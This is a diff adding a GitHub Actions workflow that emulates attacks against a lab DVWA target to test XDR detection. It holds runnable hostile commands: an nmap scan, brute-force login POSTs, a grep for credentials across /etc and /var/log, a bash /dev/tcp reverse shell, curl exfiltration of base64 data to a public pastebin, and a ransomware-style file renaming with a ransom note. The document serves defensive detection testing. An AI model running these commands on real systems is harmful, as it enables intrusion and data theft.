@@ -1,0 +1,125 @@
+# .github/workflows/adversary_emulation.yml
+#
+# This workflow simulates common cyber attacks against a known-vulnerable
+# lab environment (like DVWA) to test XDR/NDR detection capabilities.
+#
+# *** THIS IS FOR EDUCATIONAL AND AUTHORIZED USE ONLY ***
+# *** ONLY RUN THIS AGAINST LABS YOU OWN AND CONTROL ***
+#
+name: Adversary Emulation Test (MITRE ATT&CK)
+
+on:
+  # This makes the workflow a "push-button" test.
+  # It will NOT run on commit. You must run it manually
+  # from the GitHub Actions tab.
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: "IP of your DVWA/vulnerable app"
+        required: true
+        default: "localhost" # Changed to localhost as requested
+
+jobs:
+  run-attack-simulation:
+    name: Run MITRE ATT&CK Simulations
+    # This MUST run on your EC2 runner, which is inside
+    # your lab network and has the XDR agent installed.
+    runs-on: self-hosted
+
+    steps:
+      - name: Install Testing Tools
+        run: |
+          # Install nmap (for scanning) and curl (for web requests)
+          # This assumes a Debian/Ubuntu-based runner. Use 'yum' for RHEL.
+          sudo apt-get update
+          sudo apt-get install -y nmap curl
+
+      - name: 1. Run Recon - Network Service Scanning (MITRE T1046)
+        run: |
+          echo "Starting T1046: Network Service Scanning..."
+          echo "This Nmap scan will probe for open ports and services."
+          echo "Cortex XDR should detect this as a reconnaissance attempt."
+          nmap -sV -T4 ${{ github.event.inputs.target_ip }}
+
+      - name: 2. Run Credential Access - Brute Force (MITRE T1110)
+        run: |
+          echo "Starting T1110: Brute Force (Password Guessing)..."
+          echo "Simulating 5 failed login attempts against DVWA."
+          echo "Cortex XDR should detect this as a brute-force attack."
+
+          # This simulates multiple failed POST requests to a login form.
+          # The DVWA login page is typically 'login.php'.
+          for password in "password" "123456" "admin" "badpass" "root"; do
+            echo "Attempting with user 'admin' and password '$password'"
+            curl -X POST \
+              -d "username=admin&password=$password&Login=Login" \
+              --cookie "security=low; PHPSESSID=1234" \
+              http://${{ github.event.inputs.target_ip }}/login.php
+            sleep 1
+          done
+
+      - name: 3. Run Credential Access - Credentials in Files (MITRE T1552.001)
+        run: |
+          echo "Starting T1552.001: Searching for credentials in files..."
+          echo "This will use grep to search for common password strings."
+          echo "Cortex XDR should detect this sensitive file access."
+          # Create some dummy config files to find
+          echo "api_key = 12345-abcde-secret" > /tmp/config.ini
+          echo "db_pass: mySuperSecurePassword" > /tmp/app.log
+
+          # Run the grep simulation
+          grep -r -E "(password|api_key|secret)" /tmp /etc /var/log 2>/dev/null || true
+
+          # Clean up
+          rm /tmp/config.ini /tmp/app.log
+
+      - name: 4. Run C2 - Unix Shell (MITRE T1059.004)
+        run: |
+          echo "Starting T1059.004: Simulating reverse shell..."
+          echo "This will attempt to connect to a non-existent C2 server."
+          echo "Cortex XDR should detect the bash process spawning a network connection."
+
+          # This attempts a reverse shell. It will fail, but the 
+          # process and network attempt is what gets detected.
+          # We use a non-routable IP to be safe.
+          timeout 5 bash -i >& /dev/tcp/10.255.255.1/4444 0>&1 || true
+          echo "Reverse shell simulation finished."
+
+      - name: 5. Run Exfiltration - Over C2 Protocol (MITRE T1048.003)
+        run: |
+          echo "Starting T1048.003: Simulating data exfiltration via curl..."
+          echo "Cortex XDR should detect sensitive data being POSTed to an external site."
+
+          # Create fake sensitive data
+          echo "user:x:0:0:root:/root:/bin/bash" > /tmp/fake_passwd
+          echo "db_admin:super_secret_pass" >> /tmp/fake_passwd
+
+          # Exfiltrate data (base64 encoded) to a public pastebin
+          cat /tmp/fake_passwd | base64 | curl -X POST --data-binary @- "https://paste.c-net.org"
+
+          # Clean up
+          rm /tmp/fake_passwd
+
+      - name: 6. Run Impact - Data Encrypted for Impact (MITRE T1486)
+        run: |
+          echo "Starting T1486: Simulating ransomware behavior..."
+          echo "Cortex XDR should detect rapid file modification/encryption."
+
+          # Create a directory with dummy files
+          mkdir -p /tmp/victim-files
+          echo "data1" > /tmp/victim-files/file1.txt
+          echo "data2" > /tmp/victim-files/file2.py
+          echo "data3" > /tmp/victim-files/file3.log
+
+          # Create a ransom note
+          echo "Your files are locked! Pay 100 bitcoin." > /tmp/victim-files/RANSOM_NOTE.txt
+
+          # "Encrypt" the files (just rename them)
+          for f in $(find /tmp/victim-files -type f -not -name "*.locked" -not -name "*RANSOM_NOTE*"); do
+            mv "$f" "$f.locked"
+            sleep 0.1
+          done
+
+          echo "Ransomware simulation finished. Files are in /tmp/victim-files"
+          # Clean up (optional, you may want to inspect them)
+          # rm -rf /tmp/victim-files
